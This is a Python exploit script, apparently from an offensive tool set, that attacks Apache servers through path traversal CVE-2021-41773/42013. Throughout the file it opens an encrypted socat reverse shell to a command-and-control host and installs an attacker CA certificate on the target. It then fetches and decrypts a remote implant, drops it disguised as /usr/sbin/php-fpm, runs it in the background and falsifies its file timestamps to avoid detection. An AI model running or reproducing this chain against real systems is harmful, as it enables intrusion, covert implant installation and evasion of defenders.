"""Initial exploit to drop implant"""

import shlex
import socket
import ssl
import threading
import time
import requests

exploit_filename = "implant.py"


def main():
    C2_IP = "127.0.0.1" or input("enter your attacker/host/local ip:")
    TARGET_IP = "" or input("enter target ip:")
    target = TARGET_IP + ":" + "8080"
    cve_choice = 0

    CVE_2021_41773 = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash"
    CVE_2021_42013 = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash"

    # Once we connect using the CVE, we can run any command.
    url = "http://" + target + (CVE_2021_41773, CVE_2021_42013)[cve_choice % 2]

    # set up encrypted reverse shell listener so we don't send the entire exploit through unencrypted http
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(
        certfile="cert/cert.pem",
        keyfile="cert/key.pem",
        password="sB3oIHwVTtvs5HjDBis0X2Jxq1Lp-TiVmgwgyfgwqDI",
    )

    bindsocket = socket.socket()
    bindsocket.bind((C2_IP, 4444))
    bindsocket.listen(5)
    print("[*] opening socket at port 4444")

    conn_ready = threading.Event()
    conn_holder = {}

    def accept_connection():
        # accept socket connection in background thread else it will block
        newsocket, addr = bindsocket.accept()
        wrapped_conn = context.wrap_socket(newsocket, server_side=True)
        conn_holder["conn"] = wrapped_conn
        print(f"Connection accepted from {addr}")
        conn_ready.set()

    threading.Thread(target=accept_connection, daemon=True).start()

    # send encrypted reverse shell
    print("[*] opening reverse shell")
    command = ""
    command += "sudo apk add socat openssl;"
    command += f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:{C2_IP}:4444,verify=0;"
    # command = f"/bin/bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1;"
    req = requests.Request("POST", url=url, data=command)
    prepared = req.prepare()
    prepared.url = url

    def send_reverse_shell(prepared: requests.PreparedRequest):
        # send request in background thread else it will block
        try:
            requests.Session().send(prepared, verify=False, timeout=5)
        except requests.exceptions.RequestException as e:
            print(f"[!] Request exception (expected if shell launched): {e}")

    threading.Thread(target=send_reverse_shell, args=(prepared,), daemon=True).start()

    # wait until connection is established
    conn_ready.wait(timeout=5)
    conn = conn_holder["conn"]

    ca_contents = ""
    with open("cert/ca.crt", "r", encoding="utf-8") as f:
        ca_contents = f.read()

    # install attacker CA cert
    print("[*] installing attacker cert on target")
    for cmd in [
        f"echo {shlex.quote(ca_contents)} | sudo tee /usr/local/share/ca-certificates/ca.crt >/dev/null",
        "cat /usr/local/share/ca-certificates/ca.crt | sudo tee -a /etc/ssl/certs/ca-certificates.crt >/dev/null",
        "sudo update-ca-certificates",
    ]:
        conn.send(cmd.encode() + b"\n")
        time.sleep(0.5)  # prevent sending too quickly, otherwise cmds get chopped

    # install python dependencies
    print("[*] installing dependencies on target")
    for cmd in [
        "sudo apk add python py3-pip",
        "pip install -q requests pycryptodome urllib3",
        # f"/bin/bash -i >& /dev/tcp/{C2_IP}/5555 0>&1",
    ]:
        conn.send(cmd.encode() + b"\n")
        time.sleep(0.5)  # prevent sending too quickly, otherwise cmds get chopped

    # run fileless python stager to install and run implant
    print("[*] sending payload")
    c2_port = 8443
    c2_stager_endpoint = "/cdn/bootstrap.js"
    pre_shared_key = "65b53ecaba31f22e75e92d9ed95d1bebd233438d72ce2f9f2ac954ca197a679f"
    payload = "/usr/sbin/php-fpm"
    cmd = (
        r";".join(
            [
                r'sudo python3 -c "import requests,os,subprocess,sys,base64',
                r"from Crypto.Cipher import AES",
                # download encrypted payload from c2
                f"r=requests.get('https://{C2_IP}:{c2_port}{c2_stager_endpoint}',verify=False)",
                r"c=base64.b64decode(r.content)",
                # decrypt payload
                f"k=bytes.fromhex('{pre_shared_key}')",
                r"d=AES.new(k,AES.MODE_GCM,nonce=c[:12]).decrypt_and_verify(c[12:-16],c[-16:])",
                #
                # 1. create in-memory file descriptor to store payload
                # (can't - pyinstaller seems to dislike in-memory execution)
                # r"fd=os.memfd_create('x',0)",
                # r"os.write(fd,d)",
                # r"os.lseek(fd,0,os.SEEK_SET)",
                # run payload as new background process and exit
                # r"subprocess.Popen(['nohup','/proc/self/fd/'+str(fd)],stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True)",
                #
                # or 2. write to tmpfs (RAM) (can't - /dev/shm seems to not be executable)
                # r"p='/dev/shm/f6213f'",
                # r"f=open(p,'wb')",
                # r"f.write(d)",
                # r"f.close()",
                # r"os.chmod(p,0o755)",
                # r"subprocess.Popen([p],stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True)",
                #
                # or 3. write to disk and run payload (works)
                f"p='{payload}'",
                r"f=open(p,'wb');f.write(d);f.close()",
                r"os.chmod(p,0o755)",
                r"n=subprocess.DEVNULL",
                r"subprocess.Popen(['nohup',p],stdin=n,stdout=n,stderr=n,start_new_session=True)",
                # exit python command and let implant run on its own
                r"sys.exit(0)",
            ]
        )
        + r'"'
    )
    conn.send(cmd.encode() + b"\n")
    time.sleep(10)  # let download cook

    # change file times to match another binary e.g. busybox (since target is alpine)
    print(f"[*] editing {payload} file times")
    for cmd in [
        # spoof atime and mtime
        f"sudo touch -r /bin/busybox {payload}",
        # spoof ctime by changing system time
        'NOW=$(date +"%Y-%m-%d %H:%M:%S") && '
        + r"""sudo date -s "$(stat /bin/busybox | sed -n 's/^Change: \([0-9-]* [0-9:]*\)\..*/\1/p')" && """
        + f'sudo touch {payload} && sudo date -s "$NOW"',
        "unset NOW",
    ]:
        conn.send(cmd.encode() + b"\n")
        time.sleep(0.5)  # prevent sending too quickly, otherwise cmds get chopped

    # TODO: add persistence on startup

    print("[*] exiting exploit script, implant should be running on its own now")
    cmd = "exit"
    conn.send(cmd.encode() + b"\n")


if __name__ == "__main__":
    main()
